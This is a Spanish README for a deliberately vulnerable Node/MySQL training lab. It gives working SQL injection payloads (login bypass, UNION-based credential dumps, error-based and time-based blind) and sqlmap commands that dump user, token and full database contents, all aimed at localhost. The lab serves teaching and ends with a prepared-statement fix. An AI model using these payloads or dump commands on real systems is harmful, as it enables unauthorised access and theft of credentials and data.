# 🔓 SQLi Lab — Entorno Educativo de SQL Injection

> ⚠️ **ADVERTENCIA LEGAL Y ÉTICA**  
> Este proyecto es **exclusivamente educativo** y debe ejecutarse **solo en localhost**.  
> Nunca utilices estas técnicas contra sistemas sin autorización explícita. El uso indebido puede tener consecuencias legales graves.

---

## 📋 Requisitos previos

| Herramienta | Versión mínima | Descarga |
|---|---|---|
| Node.js | 18+ | https://nodejs.org |
| XAMPP (MySQL) | 8.x | https://www.apachefriends.org |
| sqlmap | 1.8+ | https://sqlmap.org |
| Python | 3.8+ | Requerido por sqlmap |

---

## 🗂️ Estructura del proyecto

```
Vulnerable/
├── app.js            ← Servidor Express con rutas vulnerables
├── init.sql          ← Script de base de datos
├── package.json
├── .env.example      ← Plantilla de variables de entorno
├── .env              ← Tu configuración local (NO subir a GitHub)
├── .gitignore
└── README.md
```

---

## ⚙️ Paso 1 — Configurar XAMPP

1. Abre **XAMPP Control Panel**
2. Haz clic en **Start** junto a **MySQL** (asegúrate de que el puerto sea 3306)
3. Opcional: también inicia **Apache** si quieres usar phpMyAdmin

---

## 🗄️ Paso 2 — Ejecutar init.sql

### Opción A — phpMyAdmin (recomendado)
1. Abre tu navegador en `http://localhost/phpmyadmin`
2. Haz clic en **Importar** (tab superior)
3. Selecciona el archivo `init.sql` de este proyecto
4. Haz clic en **Continuar / Go**

### Opción B — Línea de comandos (cmd/PowerShell)
```powershell
# Desde el directorio del proyecto
C:\xampp\mysql\bin\mysql.exe -u root -p practica < init.sql

# Sin contraseña (configuración por defecto de XAMPP)
C:\xampp\mysql\bin\mysql.exe -u root practica < init.sql
```

---

## 🔧 Paso 3 — Configurar variables de entorno

```powershell
# Copia el archivo de ejemplo
copy .env.example .env
```

El archivo `.env` ya viene preconfigurado para XAMPP:
```env
DB_HOST=localhost
DB_PORT=3306
DB_USER=root
DB_PASSWORD=
DB_NAME=practica
PORT=3000
```

---

## 📦 Paso 4 — Instalar dependencias

```powershell
npm install
```

---

## 🚀 Paso 5 — Levantar el servidor

```powershell
# Modo normal
node app.js

# Modo desarrollo con auto-reload (requiere nodemon)
npm run dev
```

El servidor estará disponible en: **http://localhost:3000**

---

## 🛣️ Rutas vulnerables disponibles

| Método | Ruta | Tipo de vulnerabilidad |
|---|---|---|
| `POST` | `/login` | Authentication Bypass |
| `GET` | `/noticias?id=1` | UNION-based SQLi |
| `GET` | `/productos?categoria=electronica` | Error-based SQLi |
| `GET` | `/buscar?q=laptop` | Blind Boolean + Time-based |
| `GET` | `/perfil?user=admin` | Data Exposure + SQLi |

---

## 🧪 Pruebas manuales con curl / Postman

### /login — Authentication Bypass
```powershell
# Bypass con OR injection
curl -X POST http://localhost:3000/login `
  -H "Content-Type: application/json" `
  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "cualquiera"}'

# Otra forma más simple
curl -X POST http://localhost:3000/login `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d "username=admin' OR '1'='1' --&password=cualquiera"
```

### /noticias — UNION-based
```
http://localhost:3000/noticias?id=1 UNION SELECT 1,username,password,email,5,6 FROM usuarios --
http://localhost:3000/noticias?id=-1 UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='practica' --
```

### /productos — Error-based
```
http://localhost:3000/productos?categoria=electronica' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --
```

### /buscar — Blind Boolean
```
http://localhost:3000/buscar?q=laptop' AND 1=1 --   → encontrados: true
http://localhost:3000/buscar?q=laptop' AND 1=2 --   → encontrados: false
http://localhost:3000/buscar?q=laptop' AND SLEEP(5) --  → demora 5 segundos
```

### /perfil — Data Exposure
```
http://localhost:3000/perfil?user=admin
http://localhost:3000/perfil?user=' OR 1=1 LIMIT 1 --
```

---

## 🤖 Ataques con sqlmap

> Instala sqlmap: `pip install sqlmap` o clona `https://github.com/sqlmapproject/sqlmap`

### 🔑 Ruta 1 — /login (POST, Authentication Bypass)
```bash
sqlmap -u "http://localhost:3000/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --dbms=mysql \
  --level=3 \
  --risk=2 \
  --dbs \
  --batch \
  --banner
```

### 📰 Ruta 2 — /noticias (UNION-based)
```bash
# Enumerar bases de datos
sqlmap -u "http://localhost:3000/noticias?id=1" \
  --dbms=mysql \
  --technique=U \
  --level=3 \
  --dbs \
  --batch

# Volcar tabla de usuarios
sqlmap -u "http://localhost:3000/noticias?id=1" \
  --dbms=mysql \
  --technique=U \
  -D practica \
  -T usuarios \
  --dump \
  --batch
```

### 🛍️ Ruta 3 — /productos (Error-based)
```bash
sqlmap -u "http://localhost:3000/productos?categoria=electronica" \
  --dbms=mysql \
  --technique=E \
  --level=3 \
  --risk=3 \
  -D practica \
  --tables \
  --batch

# Extraer datos de perfiles (token secreto)
sqlmap -u "http://localhost:3000/productos?categoria=electronica" \
  --dbms=mysql \
  --technique=E \
  -D practica \
  -T perfiles \
  --dump \
  --batch
```

### 🔍 Ruta 4 — /buscar (Blind Boolean + Time-based)
```bash
# Boolean-based blind
sqlmap -u "http://localhost:3000/buscar?q=laptop" \
  --dbms=mysql \
  --technique=B \
  --level=5 \
  --risk=3 \
  -D practica \
  -T usuarios \
  --dump \
  --batch

# Time-based blind (más lento pero más sigiloso)
sqlmap -u "http://localhost:3000/buscar?q=laptop" \
  --dbms=mysql \
  --technique=T \
  --level=5 \
  --time-sec=3 \
  -D practica \
  --tables \
  --batch
```

### 👤 Ruta 5 — /perfil (Data Exposure)
```bash
sqlmap -u "http://localhost:3000/perfil?user=admin" \
  --dbms=mysql \
  --level=3 \
  --risk=2 \
  -D practica \
  -T perfiles \
  --dump \
  --batch

# Extraer todos los tokens secretos
sqlmap -u "http://localhost:3000/perfil?user=admin" \
  --dbms=mysql \
  -D practica \
  -T perfiles \
  -C "nombre_completo,token_secreto" \
  --dump \
  --batch
```

### 🎯 Comando sqlmap completo (todas las técnicas)
```bash
sqlmap -u "http://localhost:3000/noticias?id=1" \
  --dbms=mysql \
  --technique=BEUST \
  --level=5 \
  --risk=3 \
  --dbs \
  --dump-all \
  --exclude-sysdbs \
  --batch \
  --flush-session
```

---

## 📚 Tipos de SQL Injection cubiertos

| Técnica | Ruta | Descripción |
|---|---|---|
| **Authentication Bypass** | `/login` | Evadir validación de credenciales con `' OR 1=1 --` |
| **UNION-based** | `/noticias` | Extraer datos de otras tablas con `UNION SELECT` |
| **Error-based** | `/productos` | Exfiltrar datos a través de mensajes de error de MySQL |
| **Blind Boolean** | `/buscar` | Inferir datos bit a bit según respuesta true/false |
| **Time-based Blind** | `/buscar` | Usar `SLEEP()` para confirmar inyecciones sin output |
| **Data Exposure** | `/perfil` | Datos sensibles expuestos sin autenticación |

---

## 🔒 ¿Cómo corregir estas vulnerabilidades? (Para aprender)

En un código real y seguro, siempre usa **prepared statements**:

```javascript
// ❌ VULNERABLE
const sql = `SELECT * FROM usuarios WHERE username = '${username}'`;

// ✅ SEGURO — Prepared Statement con mysql2
const sql = 'SELECT * FROM usuarios WHERE username = ? AND password = ?';
db.query(sql, [username, password], (err, results) => { ... });
```

---

## 📄 Licencia

MIT — Solo para aprendizaje en entornos controlados y autorizados.
